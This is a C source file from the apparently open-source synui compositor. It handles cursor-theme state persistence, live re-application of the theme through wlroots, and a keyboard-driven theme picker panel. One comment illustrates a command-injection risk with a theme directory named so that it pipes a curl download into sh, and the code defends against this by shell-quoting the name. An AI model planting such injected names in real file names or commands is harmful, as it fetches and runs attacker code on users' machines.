/*
 * cursor.c — cursor theme state, live re-apply, and the picker panel (Super+C)
 *
 * synui created its cursor manager as wlr_xcursor_manager_create(NULL, 24):
 * theme from the environment, size hardcoded. That is why there was no way to
 * change cursor theme short of editing the session wrapper and logging out —
 * and why a theme downloaded from opendesktop.org had nowhere to go.
 *
 * Three pieces here:
 *
 *   state    ~/.config/synui/cursor.state, the same key=value file the
 *            synui-cursor(1) helper reads and writes, so the shell tool and
 *            this panel can never disagree about what is active. Like
 *            wallpaper.state it is applied AFTER synuirc and so overrides it;
 *            delete it to hand control back to the config file.
 *
 *   apply    cursor_apply() swaps the live wlr_xcursor_manager. wlroots has no
 *            "change theme" call, so this builds a new manager and retires the
 *            old one — see the ordering note in cursor_apply(), which is the
 *            only genuinely delicate part of this file.
 *
 *   picker   a compositor-drawn modal list (Super+C), modelled directly on
 *            wppick.c: state in the server struct, drawn by
 *            synui_render_curpick() in render.c, keys swallowed while open.
 *
 * The panel finds themes by scanning the icon directories itself rather than
 * shelling out to `synui-cursor list`: a synchronous popen() would block the
 * wl_event_loop, which is the one thing no panel is allowed to do. The scan is
 * cheap (opendir plus a stat per candidate) and the definition of "is a theme"
 * is one line, so the duplication is small and deliberate.
 *
 * SynapseOS Project
 * SPDX-License-Identifier: GPL-2.0-or-later
 * https://github.com/velle999/SYNAPSE
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>
#include <unistd.h>

#include <wlr/types/wlr_cursor.h>
#include <wlr/types/wlr_xcursor_manager.h>
#include <wlr/util/log.h>
#include <wlr/xwayland.h>

#include "synui.h"

/* ── State file ──────────────────────────────────────────── */

static bool cursor_state_path(char *buf, size_t n)
{
    return syn_config_path(buf, n, "cursor.state");
}

/* Parse the key=value file written by synui-cursor(1) and by the picker.
 * Unknown keys and comments are skipped rather than rejected: this file is
 * shared with a shell script, and a strict parser would turn a future key into
 * a startup failure. */
void cursor_state_load(syn_config_t *cfg)
{
    char path[256];
    if (!cursor_state_path(path, sizeof(path))) return;

    FILE *f = fopen(path, "r");
    if (!f) return;   /* no persisted choice — synuirc stands */

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = '\0';
        char *p = line;
        while (*p == ' ' || *p == '\t') p++;
        if (*p == '#' || *p == '\0') continue;

        char *eq = strchr(p, '=');
        if (!eq) continue;
        *eq = '\0';
        char *val = eq + 1;
        while (*val == ' ' || *val == '\t') val++;

        if (strcmp(p, "theme") == 0) {
            snprintf(cfg->cursor_theme, sizeof(cfg->cursor_theme), "%s", val);
        } else if (strcmp(p, "size") == 0) {
            int px = atoi(val);
            /* A zero or negative size makes wlroots fall back in ways that are
             * hard to explain later; an enormous one is a typo that leaves the
             * pointer covering a third of the screen with no obvious way back.
             * Clamp rather than obey, the same way night_light_temp does. */
            if (px < 8)   px = 8;
            if (px > 256) px = 256;
            cfg->cursor_size = px;
        }
    }
    fclose(f);
}

void cursor_state_save(syn_server_t *s)
{
    char path[256];
    if (!cursor_state_path(path, sizeof(path))) return;
    syn_config_ensure_dir();

    /* Written to a temp file and renamed: synui-cursor(1) reads this file, and
     * a reader that catches it half-written would see a theme name truncated to
     * something that does not exist. */
    char tmp[288];
    if (snprintf(tmp, sizeof(tmp), "%s.tmp", path) >= (int)sizeof(tmp)) return;

    FILE *f = fopen(tmp, "w");
    if (!f) {
        wlr_log(WLR_ERROR, "synui: cursor: cannot write '%s': %s",
                tmp, strerror(errno));
        return;
    }
    fputs("# written by synui; shared with synui-cursor(1)\n", f);
    fprintf(f, "theme=%s\n", s->config.cursor_theme);
    fprintf(f, "size=%d\n", s->config.cursor_size > 0 ? s->config.cursor_size : 24);
    fclose(f);

    if (rename(tmp, path) != 0) {
        wlr_log(WLR_ERROR, "synui: cursor: cannot rename into '%s': %s",
                path, strerror(errno));
        unlink(tmp);
    }
}

/* ── Live apply ──────────────────────────────────────────── */

void cursor_apply(syn_server_t *s)
{
    const char *theme = s->config.cursor_theme[0] ? s->config.cursor_theme : NULL;
    int size = s->config.cursor_size > 0 ? s->config.cursor_size : 24;

    struct wlr_xcursor_manager *mgr = wlr_xcursor_manager_create(theme, size);
    if (!mgr) {
        /* Keep the manager we have. A desktop with no cursor manager at all has
         * no pointer image anywhere, which is unrecoverable without a keyboard
         * — far worse than keeping the previous theme. */
        wlr_log(WLR_ERROR, "synui: cursor: cannot create manager for '%s' at %dpx",
                theme ? theme : "(default)", size);
        return;
    }
    if (!wlr_xcursor_manager_load(mgr, 1)) {
        /* A theme that does not resolve loads nothing; wlroots then draws
         * whatever its fallback is. Warn, but continue — the user picked it and
         * a visible wrong cursor is more debuggable than a silent no-op. */
        wlr_log(WLR_ERROR, "synui: cursor: theme '%s' failed to load at %dpx",
                theme ? theme : "(default)", size);
    }

    struct wlr_xcursor_manager *old = s->cursor_mgr;
    s->cursor_mgr = mgr;

    /* ORDER MATTERS. Point the visible cursor at the NEW manager before
     * retiring the old one: the image currently on screen is owned by the old
     * manager, so destroying it first leaves the compositor briefly showing a
     * buffer that has been freed. */
    wlr_cursor_set_xcursor(s->cursor, s->cursor_mgr, "default");

    if (old) wlr_xcursor_manager_destroy(old);

    /* Children spawned from here on (the launcher, the menu, a terminal) read
     * these at startup, so a newly opened app agrees with the compositor
     * without waiting for a re-login. Already-running apps keep the old theme —
     * nothing can retroactively change that. */
    if (theme) setenv("XCURSOR_THEME", theme, 1);
    {
        char buf[16];
        snprintf(buf, sizeof(buf), "%d", size);
        setenv("XCURSOR_SIZE", buf, 1);
    }

    /* Xwayland keeps its own root cursor, set once when it became ready. Left
     * alone it would keep the previous theme's arrow over every X11 window —
     * the exact split-personality pointer that started this. */
    if (s->xwayland && s->xwayland_up) {
        struct wlr_xcursor *xc =
            wlr_xcursor_manager_get_xcursor(s->cursor_mgr, "default", 1);
        if (xc && xc->image_count > 0) {
            struct wlr_xcursor_image *img = xc->images[0];
            wlr_xwayland_set_cursor(s->xwayland, img->buffer, img->width * 4,
                                    img->width, img->height,
                                    img->hotspot_x, img->hotspot_y);
        }
    }

    wlr_log(WLR_INFO, "synui: cursor: theme '%s' at %dpx",
            theme ? theme : "(default)", size);
}

/* Re-read the state file and apply it. This is what `synctl dispatch
 * cursor_reload` runs, so synui-cursor(1) can change the pointer on a running
 * desktop without the user logging out. */
void cursor_reload(syn_server_t *s)
{
    cursor_state_load(&s->config);
    cursor_apply(s);
}

/* ── Scanning installed themes ───────────────────────────── */

/* A directory is a cursor theme when it has a cursors/ subdirectory with at
 * least one entry. Deliberately NOT index.theme: plenty of themes ship without
 * one, and some source trees ship an index.theme and no cursors at all, so
 * testing index.theme gets both cases wrong. Same rule as synui-cursor(1). */
static bool cursor_dir_is_theme(const char *path)
{
    char sub[512];
    if (snprintf(sub, sizeof(sub), "%s/cursors", path) >= (int)sizeof(sub))
        return false;

    DIR *d = opendir(sub);
    if (!d) return false;

    bool any = false;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        any = true;
        break;
    }
    closedir(d);
    return any;
}

static int cursor_cmp(const void *a, const void *b)
{
    const struct syn_cursor_theme *x = a, *y = b;
    return strcasecmp(x->name, y->name);
}

static void cursor_scan_dir(syn_server_t *s, const char *dir)
{
    DIR *d = opendir(dir);
    if (!d) return;

    struct dirent *e;
    while ((e = readdir(d)) && s->curpick.count < CURPICK_MAX) {
        if (e->d_name[0] == '.') continue;

        char path[256];
        if (snprintf(path, sizeof(path), "%s/%s", dir, e->d_name) >= (int)sizeof(path))
            continue;

        struct stat st;
        if (stat(path, &st) != 0 || !S_ISDIR(st.st_mode)) continue;
        if (!cursor_dir_is_theme(path)) continue;

        /* First directory wins, which makes a theme in ~/.local/share/icons
         * shadow a system one of the same name — the order libXcursor itself
         * searches, so the list matches what you would actually get. */
        for (int i = 0; i < s->curpick.count; i++)
            if (strcmp(s->curpick.themes[i].name, e->d_name) == 0) goto next;

        snprintf(s->curpick.themes[s->curpick.count].name,
                 sizeof(s->curpick.themes[0].name), "%s", e->d_name);
        snprintf(s->curpick.themes[s->curpick.count].path,
                 sizeof(s->curpick.themes[0].path), "%s", path);
        s->curpick.count++;
    next:
        ;
    }
    closedir(d);
}

void cursor_scan(syn_server_t *s)
{
    s->curpick.count = 0;

    const char *home = getenv("HOME");
    const char *xdg  = getenv("XDG_DATA_HOME");

    if (xdg && *xdg) {
        char dir[256];
        if (snprintf(dir, sizeof(dir), "%s/icons", xdg) < (int)sizeof(dir))
            cursor_scan_dir(s, dir);
    } else if (home && *home) {
        char dir[256];
        if (snprintf(dir, sizeof(dir), "%s/.local/share/icons", home) < (int)sizeof(dir))
            cursor_scan_dir(s, dir);
    }
    if (home && *home) {
        char dir[256];
        if (snprintf(dir, sizeof(dir), "%s/.icons", home) < (int)sizeof(dir))
            cursor_scan_dir(s, dir);
    }
    cursor_scan_dir(s, "/usr/local/share/icons");
    cursor_scan_dir(s, "/usr/share/icons");

    /* Stable order — readdir's is not, and a list that reshuffles between
     * openings is miserable to navigate. */
    qsort(s->curpick.themes, (size_t)s->curpick.count,
          sizeof(s->curpick.themes[0]), cursor_cmp);

    wlr_log(WLR_INFO, "synui: cursor: %d theme(s) found", s->curpick.count);
}

/* ── Picker panel ────────────────────────────────────────── */

static void curpick_scroll_to_selection(syn_server_t *s)
{
    if (s->curpick.selected < s->curpick.scroll)
        s->curpick.scroll = s->curpick.selected;
    if (s->curpick.selected >= s->curpick.scroll + CURPICK_ROWS)
        s->curpick.scroll = s->curpick.selected - CURPICK_ROWS + 1;
    if (s->curpick.scroll < 0) s->curpick.scroll = 0;
}

/* Open on the row that is actually active, so reopening the panel lands on the
 * cursor you are looking at rather than the top of the list. */
static int curpick_current_index(syn_server_t *s)
{
    for (int i = 0; i < s->curpick.count; i++)
        if (strcmp(s->curpick.themes[i].name, s->config.cursor_theme) == 0)
            return i;
    return 0;
}

/* Apply row idx live. Unlike the wallpaper picker this does NOT persist on every
 * keypress: arrowing through twenty themes would write the state file twenty
 * times and hand synui-cursor(1) a stream of half-considered choices. The
 * choice is committed on Enter (curpick_key). */
static void curpick_apply(syn_server_t *s, int idx)
{
    if (idx < 0 || idx >= s->curpick.count) return;

    snprintf(s->config.cursor_theme, sizeof(s->config.cursor_theme), "%s",
             s->curpick.themes[idx].name);
    cursor_apply(s);
}

int curpick_total(syn_server_t *s)
{
    return s->curpick.count;
}

/* One row's text. render.c draws; the labels live here so the panel and the
 * scan cannot drift apart. */
void curpick_row(syn_server_t *s, int row, const char **label, const char **desc)
{
    if (row < 0 || row >= s->curpick.count) { *label = ""; *desc = ""; return; }
    *label = s->curpick.themes[row].name;
    *desc  = s->curpick.themes[row].path;
}

void curpick_show(syn_server_t *s)
{
    cursor_scan(s);

    /* Remember what was active on open so Esc can put it back — a live preview
     * you cannot back out of is a trap when one of the themes is unreadable. */
    snprintf(s->curpick.restore_theme, sizeof(s->curpick.restore_theme), "%s",
             s->config.cursor_theme);

    s->curpick.visible = 1;
    s->curpick.selected = curpick_current_index(s);
    s->curpick.scroll = 0;
    curpick_scroll_to_selection(s);
    synui_render_curpick(s);
}

void curpick_hide(syn_server_t *s)
{
    s->curpick.visible = 0;
    synui_render_curpick(s);
}

void curpick_toggle(syn_server_t *s)
{
    if (s->curpick.visible) curpick_hide(s);
    else                    curpick_show(s);
}

int curpick_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
{
    if (!s->curpick.visible) return 0;

    /* Modified combos (Super+…) still reach the global bind table. */
    if (mods & (WLR_MODIFIER_LOGO | WLR_MODIFIER_SHIFT |
                WLR_MODIFIER_CTRL | WLR_MODIFIER_ALT))
        return 0;

    switch (sym) {
    case XKB_KEY_Return:
    case XKB_KEY_KP_Enter: {
        /* Commit: persist so the choice survives a restart, and hand the rest
         * of the desktop (GTK, Qt, Xwayland) to the helper, which knows all the
         * places a cursor theme has to be written. */
        cursor_state_save(s);

        /* THE NAME IS UNTRUSTED. It is a directory name, and directories get
         * here by being unpacked from an archive off the internet. synui's
         * spawn() runs /bin/sh -c, so a theme directory called
         *   evil; curl http://…​ | sh
         * would execute the moment it was selected. Quote it properly instead
         * of interpolating: single quotes make the shell take every byte
         * literally, and the '\'' dance is the only way to carry a literal
         * single quote through them. */
        char q[sizeof(s->config.cursor_theme) * 4 + 32];
        size_t qi = 0;
        const char *nm = s->config.cursor_theme;
        q[qi++] = '\'';
        for (size_t i = 0; nm[i] && qi + 8 < sizeof(q); i++) {
            if (nm[i] == '\'') {
                /* close, escaped quote, reopen */
                q[qi++] = '\''; q[qi++] = '\\'; q[qi++] = '\''; q[qi++] = '\'';
            } else {
                q[qi++] = nm[i];
            }
        }
        q[qi++] = '\'';
        q[qi]   = '\0';

        char cmd[sizeof(q) + 32];
        snprintf(cmd, sizeof(cmd), "synui-cursor set %s", q);
        synui_spawn(cmd);

        curpick_hide(s);
        return 1;
    }

    case XKB_KEY_Escape:
    case XKB_KEY_q:
        /* Back out to whatever was active when the panel opened. */
        if (strcmp(s->curpick.restore_theme, s->config.cursor_theme) != 0) {
            snprintf(s->config.cursor_theme, sizeof(s->config.cursor_theme),
                     "%s", s->curpick.restore_theme);
            cursor_apply(s);
        }
        curpick_hide(s);
        return 1;

    case XKB_KEY_Up:
    case XKB_KEY_k:
        if (s->curpick.selected > 0) {
            s->curpick.selected--;
            curpick_apply(s, s->curpick.selected);   /* live preview */
            curpick_scroll_to_selection(s);
            synui_render_curpick(s);
        }
        return 1;

    case XKB_KEY_Down:
    case XKB_KEY_j:
        if (s->curpick.selected < s->curpick.count - 1) {
            s->curpick.selected++;
            curpick_apply(s, s->curpick.selected);   /* live preview */
            curpick_scroll_to_selection(s);
            synui_render_curpick(s);
        }
        return 1;

    case XKB_KEY_plus:
    case XKB_KEY_equal:
    case XKB_KEY_KP_Add:
        /* Size steps are coarse on purpose: the useful range is small and the
         * difference between 24 and 25 is not worth a keypress. */
        if (s->config.cursor_size < 96) {
            s->config.cursor_size += 8;
            cursor_apply(s);
            synui_render_curpick(s);
        }
        return 1;

    case XKB_KEY_minus:
    case XKB_KEY_KP_Subtract:
        if (s->config.cursor_size > 16) {
            s->config.cursor_size -= 8;
            cursor_apply(s);
            synui_render_curpick(s);
        }
        return 1;

    case XKB_KEY_r:
        /* Rescan without closing — for when a theme has just been installed
         * with synui-cursor(1) from a terminal beside the panel. */
        cursor_scan(s);
        s->curpick.selected = curpick_current_index(s);
        curpick_scroll_to_selection(s);
        synui_render_curpick(s);
        return 1;
    }

    /* Swallow every other unmodified key: the panel is modal, and letting an
     * unhandled letter reach the window underneath is how a picker ends up
     * typing into whatever was focused. */
    return 1;
}
